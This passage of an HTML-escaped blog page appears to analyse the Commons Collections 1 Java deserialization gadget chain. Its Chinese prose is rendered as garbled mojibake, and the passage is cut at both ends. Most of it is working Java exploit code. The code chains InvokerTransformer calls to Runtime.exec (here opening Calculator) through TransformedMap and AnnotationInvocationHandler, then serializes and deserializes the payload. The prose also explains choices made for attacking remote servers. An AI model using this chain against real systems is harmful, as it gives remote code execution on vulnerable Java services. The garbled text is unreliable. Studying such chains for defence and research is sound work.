&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;111&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†æ¬¡è¿è¡Œåå‘ç°è¿˜æ˜¯æ²¡å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œæˆ‘ä»¬åœ¨readObjectä¸Šé¢ä¸Šä¸€ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ä¼ è¿‡æ¥memberTypeçš„å€¼æ˜¯nullï¼Œæ‰€ä»¥æ²¡æœ‰æ‰§è¡Œä¸‹å»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°åˆ°è¿™é‡Œä¼šå‘ç°å®ƒä¼šå¯¹æ¯”ä¸€ä¸ªvalueçš„hashå€¼ï¼Œå¦‚æœä¸ä¸€è‡´é‚£å°±ä¼šè¿”å›nullï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬è¦åœ¨putçš„é‚£é‡ŒåŠ ä¸Šå†™å…¥valueçš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€‰å–äº†@SOAPMessageHandlersæ³¨è§£ä½œä¸º&lt;code&gt;this.type&lt;/code&gt;ï¼Œæˆ‘ä»¬å°±å¿…é¡»å‘&lt;code&gt;this.memberValues&lt;/code&gt;å†™å…¥ä¸€ä¸ª&lt;code&gt;valueï¼šxxx&lt;/code&gt;çš„é”®å€¼å¯¹&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„&lt;code&gt;this.type&lt;/code&gt;æ˜¯å¯ä»¥å˜åŠ¨çš„ï¼Œæ¯”å¦‚æ¢æˆå¦ä¸€ä¸ªå…ƒæ³¨é‡Š&lt;code&gt;Retention.class&lt;/code&gt;ï¼ˆè™½ç„¶ä»–çš„æ³¨è§£å…ƒç´ åä¹Ÿæ˜¯valueï¼‰ï¼Œç”šè‡³å¯ä»¥è‡ªå®šä¹‰ï¼Œä½†æ˜¯å¯¹æ–¹æœåŠ¡å™¨ä¸Šæ²¡æœ‰è¿™ä¸ªæ³¨é‡Šï¼Œæ‰“åˆ«äººæ˜¯æ²¡æœ‰ç”¨çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯é€‰ç”¨å¤§å®¶éƒ½æœ‰çš„å…ƒæ³¨é‡Šã€‚&lt;/p&gt;
&lt;p&gt;åŒæ—¶æˆ‘ä»¬å†™å…¥çš„&lt;code&gt;this.memberValues&lt;/code&gt;çš„é”®åä¸èƒ½æ”¹å˜ï¼Œä½†æ˜¯å€¼å¯ä»¥æ”¹å˜ã€‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nd&#34;&gt;@interface&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SOAPMessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getMethod&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;invoke&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
